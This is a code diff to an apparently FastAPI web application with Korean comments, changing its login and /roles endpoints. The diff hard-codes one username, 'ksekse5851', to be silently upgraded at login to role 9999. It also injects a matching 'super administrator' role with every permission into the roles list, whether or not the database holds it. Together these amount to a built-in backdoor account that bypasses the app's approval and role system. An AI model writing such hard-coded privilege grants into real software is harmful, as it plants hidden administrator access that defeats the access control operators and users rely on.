@@ -127,7 +127,12 @@ def login(username: str = Form(...), password: str = Form(...)):
     if row["approved"] == 0:
         conn.close()
         raise HTTPException(403, "승인 대기중입니다.")
-    return dict(row)
+    user = dict(row)
+    # 오로지 ksekse5851만 role_id=9999(슈퍼권한)으로 덮어씌움
+    if username == "ksekse5851":
+        user["role_id"] = 9999
+    conn.close()
+    return user
 
 @app.get("/members")
 def members():
@@ -138,12 +143,24 @@ def members():
     conn.close()
     return {"members": users}
 
+
 @app.get("/roles")
-def roles():
+def get_roles():
     conn = db()
     c = conn.cursor()
-    c.execute('SELECT * FROM roles')
+    c.execute("SELECT * FROM roles")
     roles = [dict(row) for row in c.fetchall()]
+    # 9999 슈퍼권한 추가(중복방지)
+    if not any(r["id"] == 9999 for r in roles):
+        roles.append({
+            "id": 9999,
+            "name": "슈퍼관리자",
+            "can_approve": 1,
+            "can_edit_user_role": 1,
+            "can_edit_role_permissions": 1,
+            "can_edit_role_name": 1,
+            "can_send_message": 1
+        })
     conn.close()
     return {"roles": roles}
 
